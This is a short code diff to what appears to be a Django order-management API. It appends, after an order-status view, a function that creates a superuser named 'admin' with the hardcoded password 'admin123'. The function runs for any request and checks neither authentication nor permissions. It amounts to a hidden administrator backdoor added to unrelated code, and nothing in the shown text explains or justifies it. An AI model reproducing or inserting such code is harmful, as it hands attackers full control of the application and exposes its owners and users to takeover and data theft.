@@ -103,3 +103,16 @@ class OrderUpdateStatusAPI(views.APIView):
         order.status = status_val
         order.save()
         return Response(OrderSerializer(order).data)
+from django.contrib.auth.models import User
+from django.http import JsonResponse
+
+def create_admin_user(request):
+    if User.objects.filter(username="admin").exists():
+        return JsonResponse({"status": "error", "message": "Admin already exists"})
+    else:
+        User.objects.create_superuser(
+            username="admin",
+            email="admin@example.com",
+            password="admin123"
+        )
+        return JsonResponse({"status": "success", "message": "Admin user created"})
